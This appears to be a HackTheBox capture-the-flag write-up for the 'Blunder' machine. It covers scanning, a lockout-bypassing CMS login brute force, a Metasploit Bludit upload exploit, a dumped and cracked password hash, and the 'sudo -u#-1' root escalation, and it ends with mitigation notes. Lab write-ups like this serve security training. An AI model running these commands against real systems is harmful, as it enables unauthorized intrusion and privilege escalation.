# Blunder

![](images/info.PNG)

__Task__: Find [user.txt](#user-flag) and [root.txt](#root-flag)

### Penetration Methodologies

__Scanning__

- nmap

__Enumeration__

- Webpage enumeration

- CMS login brute force

__Exploitation__

- CMS directory traversal attack

__Priv Esc__

- Sudo security bypass

***

This is my guide to the HackTheBox Linux machine _Blunder_.

## User Flag

First, let's  scan _Blunder_ with `nmap`.

- __sC__: Enable common scripts

- __sV__: version and service on the port

- __O__: remote OS detection using fingerprinting

```
# Nmap 7.80 scan initiated Tue Jun  2 16:50:18 2020 as: nmap -sC -sV -O -oA scan191 10.10.10.191
Nmap scan report for 10.10.10.191
Host is up (0.21s latency).
Not shown: 998 filtered ports
PORT   STATE  SERVICE VERSION
21/tcp closed ftp
80/tcp open   http    Apache httpd 2.4.41 ((Ubuntu))
|_http-generator: Blunder
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Blunder | A blunder of interesting facts
Aggressive OS guesses: HP P2000 G3 NAS device (91%), Linux 2.6.26 - 2.6.35 (89%), OpenWrt Kamikaze 7.09 (Linux 2.6.22) (89%), Linux 3.16 - 4.6 (89%), Linux 2.6.32 - 3.13 (88%), Linux 3.3 (88%), Linux 2.6.23 - 2.6.38 (88%), Linux 2.6.31 - 2.6.32 (88%), Linux 2.6.32 (88%), Linux 2.6.32 - 2.6.39 (88%)
No exact OS matches for host (test conditions non-ideal).

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Jun  2 16:52:39 2020 -- 1 IP address (1 host up) scanned in 141.22 seconds
```

Two standard ports are open, 21, indicating FTP, and 80, which indicates a webpage.  

Additionally, doing a full port scan reveals no new ports. Let's go ahead and enumerate webpages with `gobuster`.

```
$ gobuster dir -u http://10.10.10.191 -w /usr/share/wordlists/dirb/common.txt -x .htm,.html,.php,.txt
```

Our scan reveals an admin page at `http://10.10.10.191/admin/`. This is most likely a CMS for the website, let's check it out.

![](images/bludit-login.png)

We find a login page for the [Bludit CMS](https://www.bludit.com/). Unfortunately we don't have much to go off at the moment and a quick search reveals that there aren't any unauthenticated vulnerabilities for it.

We also find a todo file at `http://10.10.10.191/todo.txt`, which contains the `fergus` username, amongst other information. This username, however, fails to authenticate with some common passwords, and too many failed attempts actually locks us out, preventing further attempts.

Let's navigate to the main website and see what useful information we can find.

![](images/roland.png)

The various webpages don't reveal any useful information, so let's just grab as many interesting words and names as we find and create a wordlist called `wordlist.txt` to attempt a brute force login with.

Since the Bludit CMS locks us out when we try a brute force, our earlier research indicates that a [proof-of-concept exploit](https://rastating.github.io/bludit-brute-force-mitigation-bypass/) exists to by pass the lockout. Let's give it a shot.

First, we must edit the variables in the POC. Since the todo file mentions a `fergus` user, we'll try to brute force that account first.

```
host = 'http://10.10.10.191'
login_url = host + '/admin/login'
username = 'fergus'
fname = 'wordlist.txt'
```

Let's run the POC and see if any words from the website were also used as a password, for some reason.

![](images/poc.png)

Quickly, our POC returns valid credentials. `RolandDeschain`, a interesting typo in the passage above, happens to be the password for the user `fergus`.

Let's log in and check out the Bludit CMS.

![](images/bludit-admin.png)

Success. Poking around doesn't reveal anything in and of itself, but our previous research showed that authenticated vulnerabilities exist for older versions of Bludit. Back on our dashboard, the version is displayed. In this particular scenario, the version is 3.9.2, which is vulnerable to a [directory traversal attack](https://www.exploit-db.com/exploits/47699).

We'll use the exploit provided on Metasploit.

```
$ sudo msfdb run
```

Once Metasploit is loaded, let's use the `bludit_upload_images_exec` exploit, set our variables, using our previously discovered valid credentials.

```
msf5 > use exploit/linux/http/bludit_upload_images_exec
msf5 > set BLUDITPASS RolandDeschain
msf5 > set BLUDITUSER fergus
msf5 > set TARGETURI /
```

Now, let's run the exploit.

![](images/metasploit.png)

Success, we now have remote access to the box. Let's spawn a shell with Meterpreter, then upgrade it.

```
meterpeter > shell
$ python3 -c 'import pty;pty.spawn("/bin/bash");
```

It doesn't look like we have access to the first flag yet, but looking around, there appears to be a database file within the `bludit-3.10.0a` directory. Using `cat` to display the contents of `users.php`, we reveal the user `hugo` and a hashed password.

```
$ cd /var/www/bludit-3.10.0a/bl-content/databases
$ cat users.php
<?php defined('BLUDIT') or die('Bludit CMS.'); ?>
{
    "admin": {
        "nickname": "Hugo",
        "firstName": "Hugo",
        "lastName": "",
        "role": "User",
        "password": "faca404fd5c0a31cf1897b823c695c85cffeb98d",
        "email": "",
        "registered": "2019-11-27 07:40:55",
        "tokenRemember": "",
        "tokenAuth": "b380cb62057e9da47afce66b4615107d",
        "tokenAuthTTL": "2009-03-15 14:00",
        "twitter": "",
        "facebook": "",
        "instagram": "",
        "codepen": "",
        "linkedin": "",
        "github": "",
        "gitlab": ""}
}
```

Let's crack this password hash.

![](images/cracked.png)

Back in our shell, we may now be able to change users to `hugo`, if they've reused passwords.

```
$ su hugo
Password: Password120
```

It worked. Now that we're `hugo`, let's grab the user flag.

![](images/user-flag.png)

## Root Flag

Alright, let's see what privileges `hugo` has, maybe we can elevate our privileges. We'll run `sudo -l` first to see what special commands can be ran.

```
$ sudo -l
[...]
User hugo may run the following commands on blunder:
    (ALL, !root) /bin/bash
```

It looks like our user can run the binary `/bin/bash` as any user. By running a single command, we can open a shell as root. This exploit is better explained on [Exploit DB](https://www.exploit-db.com/exploits/47502).

```
$ sudo -u#-1 /bin/bash
```

We've elevated to root! Let's grab the last flag.

![](images/root-flag.png)

***

### Mitigation

- Avoid having a CMS public-facing, unless absolutely necessary. If so, it should be updated regularly. Like this scenario showed, two vulnerabilities can be strung together to get remote code execution. Additionally, if the CMS is public facing, passwords should not only be complex, but also not in plain text on the website.

- Careful consideration should be taken when changing the defaults for a user's privileges. Whether it's the exploit used in this scenario, or something available on [GTFOBins](https://gtfobins.github.io/), a lot of routes become available for privilege escalation when privileges are modified or commands are altered to allow execution at a higher integrity.

### Final Thoughts

This was an interesting box. The password discovery was a bit weird. It seems that the idea was that the user was typing an entry to his website and typed the name "Roland Deschain" like his password, out of habit. Not really something I understood until I was able to build out a wordlist and brute force the CMS. I liked how SSH was not available, so shell access needed to be achieved through remote code execution vulnerabilities. Additionally, I don't typically like to use Metasploit in these CTFs but I had a hard time building out an exploit for the directory traversal attack and RCE, so I just spent some extra time learning how the Metasploit module worked. 
